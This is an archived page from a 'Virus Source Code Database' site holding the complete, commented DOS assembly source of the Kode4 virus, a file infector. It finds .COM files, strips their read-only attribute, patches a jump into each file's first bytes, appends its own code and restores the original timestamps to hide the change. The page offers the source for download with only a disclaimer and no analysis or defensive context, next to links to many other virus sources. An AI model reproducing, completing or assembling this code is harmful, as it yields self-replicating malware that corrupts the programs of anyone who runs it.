<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: kode4-2__asm</title>
<meta name="KEYWORDS" content="kode4-2_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for kode4-2_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h
V_Length        equ     vend-vstart
KODE4           proc    far       
start           label   near            
                db      0E9h,00h,00h
            
                
vstart          equ     $
                
                mov     si,100h                 ;get si to point to 100
                mov     di,102h                 ;get di to point to 102
lback:          inc     di                      ;increment di
                mov     ax,word ptr [si]        ;si is ponting to ax
                cmp     word ptr [di],ax        ;compare ax with di loc
                jne     lback                   ;INE go back and inc di
                                                

                mov     ax,word ptr [si+1]
                cmp     ax,word ptr [di+1]
                je      lout
                jmp     lback

lout:           add     di,3h                   ;jmp stored in the end
                sub     di,(v_length+100h)      ;+3 to get to end and -
                mov     si,di                   ;
;**********************************************************************
;*
;*  The above code can be re-written as follows...
;*  The above idea, although it works is very long in code....
;*  when DOS does a load and execute it pushes all registers the last
;*  register to be pushed contains the file length. so just subtract
;*  the current location
;**********************************************************************
;
;
;
;Host_Off:       pop     bp
;                sub     bp,offset host_off
;                mov     si,bp
;
;*** Before opening any file copy the original three bytes back to 100h
;*** Because they will get overwritten when you check any new files
                lea     di,temp_buff
                add     di,si
                mov     ax,word ptr [di]
                mov     cl,byte ptr [di+2]
                mov     di,100h
                mov     word ptr [di],ax
                mov     byte ptr [di+2],cl


                mov     ah,4Eh             ;Find first Com file
                mov     dx,offset filename  ; offset of "*.com"     
                add     dx,si
                int     21h                
                jnc     back
                jmp     done                         
Back:                                       
                mov     ah,43h              ;get rid of read only
                mov     al,0
                mov     dx,9eh
                int     21h
                mov     ah,43h
                mov     al,01
                and     cx,11111110b
                int     21h
                
                mov     ax,3D02h           ;Open file for read/writing
                mov     dx,9Eh             ;get file name from file DTA
                int     21h
                jnc     next                              
                jmp     done
next:           mov     bx,ax               ;save handle in bx
                mov     ah,57h              ;get time date
                mov     al,0
                int     21h
                
                push    cx                  ;put in stack for later
                push    dx

                mov     ax,4200h        ; Move ptr to start of file
                xor     cx,cx
                xor     dx,dx
                int     21h
                                
                
                mov     ah,3fh                ;load first 3 bytes
                mov     cx,3
                
                mov     dx,offset temp_buff 
                add     dx,si
                int     21h
        
                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax,4202h
                int     21h
                sub     ax,3                    ; Fix for real location
                push    ax
              ; nop                             ;
              ; nop                             ; used for debugging
              ; nop                             ;
              ; nop                             ;
              ; nop
                
                mov     di,offset temp_buff
                add     di,si
                mov     word ptr [j_code2+si],ax; Save two bytes in a 
                                                ; word [jumpin]

                cmp     byte ptr [di],0e9h  ;look for a jmp at begining
                jne     infect

                mov     cx,word ptr [di+1]  ;check for XXX bytes at end
                pop     ax
                sub     ax,v_length
                cmp     ax, cx              ; jump (id string to check)
                jne     infect
                jmp     finish



infect:      
                
                xor     cx,cx           ;move file pointer to begining 
                xor     dx,dx           ;to write jump
                mov     ax,4200h
                int     21h

                mov     ah,40h           ;write jump in first 3 bytes
                mov     cx,3
                mov     dx, offset j_code1
                add     dx,si
                int     21h

                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax, 4202h
                int     21h

                mov     dx,offset vstart    
                add     dx,si            ;Start writing at top of virus
                mov     cx,(vend-vstart)   ; Set for length of virus
                mov     ah,40h             ;Write Data into the file
                int     21h                   


Finish:         pop     dx                 ;Restore old dates and times 
                pop     cx
                mov     ah,57h
                mov     al,01h
                int     21h

                mov     ah,3Eh             ;Close the file
                int     21h                   
                
                mov     ah,4Fh             ;Find Next file
                int     21h                    
                jc      done
                jmp     back
                
done:
                mov     bp,100h
                jmp     bp


filename        db      "*.com",0                     
DATA            db      " -=+ Kode4 +=-, The one and ONLY!$"

j_code1         db      0e9h 
j_code2         db      00h,00h
temp_buff       db      0cdh,020h,090h  ; CD 20 NOP
kode4           endp    

vend            equ     $

seg_a           ends

                end     start



</textarea></td></tr></table></body></html>
